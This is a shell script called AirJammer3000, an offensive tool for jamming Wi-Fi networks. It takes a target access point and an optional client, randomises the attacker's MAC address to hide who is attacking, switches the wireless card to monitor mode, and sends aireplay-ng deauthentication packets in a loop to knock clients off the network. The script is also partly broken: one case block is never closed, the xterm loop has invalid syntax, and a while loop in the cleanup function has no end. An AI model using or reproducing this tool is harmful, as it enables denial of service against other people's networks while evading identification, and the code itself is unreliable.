#!/bin/sh

# AirJammer3000: aireplay deauth attack with automated MAC shifting, single target or full network;
# insert AP MAC, channel #, and target MAC [optional]

# TODO:
#	- ask if user wants to change MAC between attacks
#	- do things in xterms
#	- add xterm scanning option
#	- unset yn and vars before reusing
#

# color codes
red="\e[0;91m"
blue="\e[0;94m"
expand_bg="\e[K"
blue_bg="\e[0;104m${expand_bg}"
red_bg="\e[0;101m${expand_bg}"
green_bg="\e[0;102m${expand_bg}"
green="\e[0;92m"
white="\e[0;97m"
bold="\e[1m"
uline="\e[4m"
yellow="\e[1;33m"
purple="\e[0;35m"
cyan="\e[0;36m"
reset="\e[0m"

# setting up environment

# TBRA check value function, needs previous function as argument
function var_check() {
	unset yn && unset flag && flag=true
	while [[ $flag == true ]]; do
		read -p "|#	>> are you sure? [y/N]: " yn
		yn=${yn:-"N"}
		case $yn in
			[Yy] )	printf "|#	Alright. continuing...\n"; flag=false;;
       	        	[Nn] )	printf "|#	Alright. select again...\n"; $1;;
			* )	printf "|#	Not a valid option.\n";;
		esac
	done
}

# get interface
function get_iface() {
	j=1
	for i in $(iw dev | grep Interface | awk -F ' ' '{print$2}'); do
		printf "|#  available wireless interfaces:\n"
		printf "|#---------------------------------------\n"
		printf "|#	${j}) ${i}\n"
		printf "|#---------------------------------------\n"
		let j=$j+1
	done
	read -p "|#     >> what wireless interface do you wish to use? [1-$j]: " ifn
	iface=$(sed ''"${ifn}"'!d' <<< $( iw dev | grep Interface | awk -F ' ' '{print$2}'))
	printf "|#	Interface selected: ${iface}.\n"
}

# change MAC + put interface in monitor mode
function set_iface() {
	printf "${purple}|#	setting up wireless card...\n${white}"
	ifconfig $iface down
	macchanger -r $iface | grep -v 'Permanent'
	iwconfig $iface mode monitor
	ifconfig $iface up
	printf "${purple}|#	checking $iface mode...\n${white}"
	iwconfig $iface | grep Mode
	macchanger -s $iface | grep -v 'Permanent'
	printf "${purple}|#\n${cyan}"
}

function get_target() {
	read -p "|#		>>Insert BSSID to jam: " bssid
	read -p "|#		>>Insert channel [put 0 to keep default]: " chan
		chan=${chan:-"0"}
		if [ ${chan} -ne 0 ]; then
			printf "${purple}|#      setting channel ${chan}...\n|#		${reset}"
			iwconfig $iface channel ${chan}
			sleep 1
			iw $iface info | grep channel
	        else
	                printf "${purple}|#      channel remains the same...\n${cyan}"
	        fi
	printf "${cyan}"
	read -p "|#	>>Insert specific client's MAC [0 for global attack]: " client
	read -p "|#	>>Insert waiting time between deauth tries: " sleep
}







# start aireplay attack, needs first time flag 'counter' set [first run is 0 (infinite), others is 1]
function air_jammer () {
	printf "${blue}|#  Starting attack... [close xterm to stop]\n"
	# start xterm
	xterm -hold -e ' \
		counter=${1}									&& \
		while [ $counter -lt 17 ] 							&& \
		do										&& \
			printf "${purple}|#	deauth in progress...\n${blue}"			&& \
			if [ ${client} != '0' ]							&& \
			then	aireplay-ng -0 5 -a $bssid -c $client $iface			&& \
			else 	aireplay-ng -0 5 -a $bssid $iface				&& \
			fi									&& \
			#printf "${purple}|#	randomizing MAC...\n${white}"			&& \
			#ifconfig $iface down							&& \
			#macchanger -r $iface | grep New					&& \
			#ifconfig $iface up							&& \
			iwconfig $iface | grep counter						&& \
			printf "${purple}|#	waiting...\n"					&& \
			sleep $sleep								&& \
			printf "|#	restarting...\n${reset}"				&& \
			let counter=$counter+$counter						&& \
		done'
	# end xterm
	if [ $counter -ne 0 ]
		then trap_ctrlc
	fi
}








# stop + clean-up [Ctrl+C]
function trap_ctrlc () {
	# perform cleanup here
	printf "${yellow}\n"
	printf "|#${red}${bold}  AirJammer shutting down...\n${reset}"
	printf "${purple}|#	current state:\n${white}"
	iwconfig $iface | grep Mode
	macchanger -s $iface | grep Current
	printf "${purple}|#\n${cyan}"
	unset yn && flag=true
	while [[ $flag == true ]]; do
		read -p "|#  >>Do you want to give it another shot? [Y/n] " yn
       	        yn=${yn:-"Y"}
		case $yn in
			[Yy] )	printf "${purple}|#		okay. restarting AirJammer...${yellow}[5 shots per cycle]\n"; air_jammer 1;;
			[Nn] )	printf "${purple}|#		...attack has ended.\n${blue}|#\n${cyan}"; flag=false;;
			* ) 	printf "{purple}|#        Not a valid option.\n";;
		esac
	done
	unset yn && flag=false
	while [[ $flag != true ]]
	do
		read -p "|#	 >>Do you want to set a new MAC? [Y/n] " yn
       	        yn=${yn:-"Y"}
		case $yn in
			[Yy] )	printf "${purple}|#	ok. setting random mac...\n${white}"; ifconfig $iface down; macchanger -r $iface | grep -v 'Permanent'; ifconfig $iface up; printf "${blue}|#\n${cyan}";;
			[Nn] )	printf "${purple}|#	ok. keeping MAC...\n${reset}"; printf "${blue}|#\n${cyan}";;
			* )	printf "{purple}|#        Not a valid option.\n";;
		esac
	unset yn && flag=false
	while [[ $flag != true ]]
	do
		read -p "|#	>>Do you want to reset managed mode? [Y/n] " yn
       	        yn=${yn:-"Y"}
		case $yn in
			[Yy] ) printf "${purple}|#	ok. setting managed mode...\n${white}"; ifconfig $iface down; iwconfig $iface mode managed; ifconfig $iface up; iwconfig $iface | grep 'Mode';;
			[Nn] ) printf "${purple}|#	ok. keeping current mode...\n${white}"; iwconfig $iface | grep 'Mode';;
			* ) 	printf "{purple}|#        Not a valid option.\n";;
		esac
	done
	printf "${blue}|#  Done.\n${reset}"
	# exit w/ error code: 2; if omitted, shell script will continue execution
	exit 2
}


# main
printf "${yellow}"
printf "|#${blue}${bold}  AirJammer3000 starting up...\n${reset}"
printf "${purple}|#\n${reset}"
read -p "|#     >> press enter to begin setup... "
# make calls
get_iface
var_check get_iface
# do you need to scan for targets?
read -p "|#	>> do you have a pre-selected Target or do you want to Scan for a new one? [T/S]: " fate
case $fate in





set_iface


# initialise trap to call trap_ctrlc function
# when signal 2 (SIGINT) is received
trap "trap_ctrlc" 2

# start process
read -p "|#     >>Press enter to start..."
air_jammer 0







